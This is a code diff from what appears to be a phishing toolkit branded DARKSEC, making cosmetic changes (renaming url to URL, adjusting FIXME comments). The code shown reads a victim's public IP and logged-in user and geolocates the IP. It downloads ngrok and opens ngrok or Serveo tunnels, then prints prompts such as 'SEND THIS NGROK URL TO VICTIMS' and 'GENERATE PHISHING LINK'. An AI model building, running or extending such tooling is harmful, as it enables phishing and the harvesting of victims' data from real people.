@@ -309,7 +309,7 @@ class ActionsManager:
                 if len(lines) != 0:
                     ip = re.match('Victim Public IP: (.*.*.*)\n',lines).group(1)
                     user = re.match(
-                        'Current logged in user: (a-z0-9)\n', lines)  # FIXME
+                        'Current logged in user: (a-z0-9)\n', lines)
                     resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                     ipinfo = json.loads(resp.read().decode(
                         resp.info().get_param('charset') or 'utf-8'))
@@ -391,11 +391,11 @@ class ServerManager:
                     system(
                         'curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
                     urlFile = open('ngrok.url', 'r')
-                    url = urlFile.read()
+                    URL = urlFile.read()
                     urlFile.close()
-                    if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
+                    if re.match("https://[0-9a-z]*\.ngrok.io", URL) != None:
                         print("\n{0}[{1}!{0}]{1} SEND THIS NGROK URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} NGROK URL: {2}".format(
-                            MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
+                            MAIN0, MAIN2, MAIN3, port) + URL + "{1}".format(MAIN0, MAIN4, MAIN3))
                         print("\n")
                         break
 
@@ -426,8 +426,8 @@ class ServerManager:
                         filename = 'ngrok-stable-{0}-amd64.zip'.format(ostype)
                     else:
                         filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
-                url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
-                download(url)
+                URL = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
+                download(URL)
                 system('unzip ' + filename)
                 system('mv ngrok Server/ngrok')
                 system('rm -Rf ' + filename)
@@ -442,7 +442,7 @@ class ServerManager:
             {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ SERVEO URL TYPE SELECTION ]\n-------------------------------\n[{1}!{0}]{1}REMEMBER ? Serveo Don't Allow Phishing.\n{0}[{1}!{0}]{1}They Drop Their Connection Whenever Detect Phishing. '''.format(MAIN0, MAIN2))
         print(
             "\n{0}[{1}*{0}]{0}CHOOSE ANY SERVEO URL TYPE TO GENERATE PHISHING LINK:{1}".format(MAIN0, MAIN2))
-        print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)".format(
+        print("\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed URL) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random URL)".format(
             MAIN0, MAIN2))
         choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(MAIN0, MAIN2))
         system('clear')
@@ -454,7 +454,7 @@ class ServerManager:
             system('clear')
             return ServerManager.runServeo(port)
 
-    def customServeo(port):
+    def customServeo(port): #FIXME
 
         print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -473,7 +473,7 @@ class ServerManager:
             output = check_output(
                 "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
             # FIXME pylint(BAD STR STRIP CALL)
-            url = str(output).strip("b ' \ n r")
+            URL = str(output).strip("b ' \ n r")
             system('clear')
             print('''
             {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -482,7 +482,7 @@ class ServerManager:
             {0}http://github.com/darksecdevelopers
             {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------'''.format(MAIN0, MAIN2))
             print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(
-                MAIN0, MAIN2, MAIN3, port) + url + "{}".format(MAIN0))
+                MAIN0, MAIN2, MAIN3, port) + URL + "{}".format(MAIN0))
             print("\n")
 
         except CalledProcessError:
@@ -492,7 +492,7 @@ class ServerManager:
             system('clear')
             return ServerManager.customServeo(port)  # FIXME
 
-    def randomServeo(port):
+    def randomServeo(port): #FIXME
         system('clear')
         print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
@@ -505,15 +505,15 @@ class ServerManager:
         try:
             output = check_output(
                 "grep -o '.\{0,0\}http.\{0,100\}' link.url", shell=True)
-            url = str(output).strip("b ' \ n r")  # FIXME
+            URL = str(output).strip("b ' \ n r")  # FIXME
             print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(
-                MAIN0, MAIN4, MAIN3, port) + url + "{}".format(MAIN0))
+                MAIN0, MAIN4, MAIN3, port) + URL + "{}".format(MAIN0))
             print("\n")
         except CalledProcessError:
 
             sleep(4)
             system('clear')
-            return ServerManager.randomServeo(port)  # FIXME
+            return ServerManager.randomServeo(port)
 
 
 class EssentialsManager:
